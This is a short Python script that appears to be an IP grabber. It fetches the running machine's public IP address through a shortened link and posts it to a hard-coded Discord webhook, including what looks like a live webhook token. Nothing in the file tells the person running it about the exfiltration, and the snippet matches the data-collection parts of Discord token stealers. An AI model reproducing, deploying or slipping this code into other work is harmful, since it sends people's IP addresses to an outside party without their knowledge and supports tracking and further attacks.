import requests 
from base64 import b64decode
from discord_webhook import DiscordWebhook
from urllib.request import Request, urlopen

webhookurl = 'https://discord.com/api/webhooks/999301480051920916/Iyr6Tb7Vx22vK0KXaZcBLhInoIYKGzTlmSDxzYXfOA_fFpNVcby8VsoeOCyXOPov7-wh'

ip = urlopen(Request("https://bit.ly/2PTxfFq")).read().decode().strip()

webhook = DiscordWebhook(url=f'{webhookurl}', content=f'Ip adress: {ip} \n')
response = webhook.execute()